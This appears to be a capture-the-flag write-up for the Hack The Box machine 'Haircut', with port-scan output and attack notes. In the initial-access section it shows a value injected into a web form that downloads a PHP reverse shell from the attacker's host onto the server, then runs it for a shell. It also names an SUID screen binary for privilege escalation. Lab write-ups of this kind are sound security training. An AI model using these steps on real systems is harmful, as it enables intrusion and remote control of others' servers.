# Haircut - Linux

## Enumeration

nmap scan 

```bash
┌──(kali㉿kali)-[~/hackthebox/haircut]
└─$ threader3000
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner
                       Version 1.0.7
                   A project by The Mayor
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.10.24
------------------------------------------------------------
Scanning target 10.10.10.24
Time started: 2021-09-17 09:08:46.007783
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:01:09.318349
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.10.24 10.10.10.24
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.10.24 10.10.10.24
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 09:10 EDT
Nmap scan report for haircut.htb (10.10.10.24)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.34 seconds
```

gobuster scan only revelaed a `/uploads` directory and an `exposed.php` file

![Untitled](Haircut%20-%20Linux%201d2045cfd5b84b05a0782c189ed8c67b/Untitled.png)

## Initial access

In the [exposed.ph](http://exposed.ph)p input field 

```bash
# uploaded a reverse shell script to the uploads directory of the server
http://10.10.14.9:8000/php-reverse-shell.php -o uploads/shell.php
```

Then tried to run the script by going to [http://10.10.10.24/uploads/shell.php](http://10.10.10.24/uploads/shell.php) from the browser

gained a shell as www-data

## Privilege Escalation

![Untitled](Haircut%20-%20Linux%201d2045cfd5b84b05a0782c189ed8c67b/Untitled%201.png)

SUID binary `screen` is vulnerable